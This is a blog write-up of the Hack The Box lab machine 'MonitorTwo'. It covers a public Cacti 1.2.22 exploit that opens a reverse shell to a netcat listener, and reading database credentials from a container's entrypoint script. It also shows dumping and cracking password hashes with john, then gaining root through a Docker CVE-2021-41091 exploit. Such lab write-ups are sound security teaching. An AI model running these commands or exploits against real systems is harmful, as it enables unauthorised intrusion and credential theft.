---
layout: single
title: MonitorTwo - Hack The Box
date: 2023-06-30
excerpt: "Monitor Two is an easy machine from hackthebox. In carrying out the enumeration process from the target, we can identify the out-dated version of cacti. by exploiting, we can easily access the server. to get to marcus, we can find the entrypoint.sh file with the user and password information for the database. to get root privileges, we can use the docker service to exploit it. because that version of docker has a vulnerability of CVE-2021-41091"
header:
  teaser: /assets/img/monitortwo/cover.png
  teaser_home_page: true
  icon: /assets/htb.png
categories:
  - hackthebox
  - infosec
tag:
    - cactus
    - cacti
    - docker
    - weak permissions
    - CVE-2021-41091
    - CVE-2022-46169


toc: true
toc_sticky: true
---
![](/assets/img/monitortwo/cover.png)

## Synopsis

Monitor Two is an easy machine from hackthebox. In carrying out the enumeration process from the target, we can identify the out-dated version of cacti. by exploiting, we can easily access the server. to get to marcus, we can find the entrypoint.sh file with the user and password information for the database. to get root privileges, we can use the docker service to exploit it. because that version of docker has a vulnerability of CVE-2021-41091.

## Portscan

```powershell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Reconnaisance

first thing that we have to do is check http on port 80, because only two ports open.

### HTTP

as you can see, there is login page based on cacti. i already use admin:password for credentials with no luck. if you check the Version 1.2.22 on google, there is a lot of public exploitation script.

![](/assets/img/monitortwo/1.png)

you can clone this exploit in [here](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22). Execute this command below will lead you into **container**.

```bash
python exploit.py -u http://10.10.11.211/ --LHOST=10.10.14.57 --LPORT=9000

#catch exploit using netact
rlwrap nc -lnvp 9000
```
![](/assets/img/monitortwo/2.png)

inside containerd we cannot do a lot of things, i was uploaded linpeas.sh and given output name with result.txt. inside the output file, i found two important files such as:

![](/assets/img/monitortwo/3.png)

inside entrypoint.sh we can discover mysql command with username and password

```bash
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi
```

in my case, i cannot run mysql command without tag -e. so i just dump tables **user_auth** and get the salt password for user `marcus` and `admin` with  command:

```bash
mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
```

![](/assets/img/monitortwo/4.png)

after found this salt password, we can used tools such as `john` or `hashcat`, but in this time i prefered use `john`.

```bash
john hash -w=/usr/share/wordlists/rockyou.txt 
```

![](/assets/img/monitortwo/5.png)

## Privilege Escalation

run command `docker version` will show the way to gain root access.

![](/assets/img/monitortwo/6.png)

This version `20.10.5+dfsg1` affected of [CVE-2021-41091](https://nvd.nist.gov/vuln/detail/CVE-2021-41091) and you can find the exploit script in [here](https://github.com/UncleJ4ck/CVE-2021-41091). Uploaded into target and run exploit script will given you a container with root access.

![](/assets/img/monitortwo/7.png)

you can access it with command:

```bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85│
f73fdba372cb2f1/merged/bin/bash -p
```

![](/assets/img/monitortwo/8.png)

## Refferencess

```console
```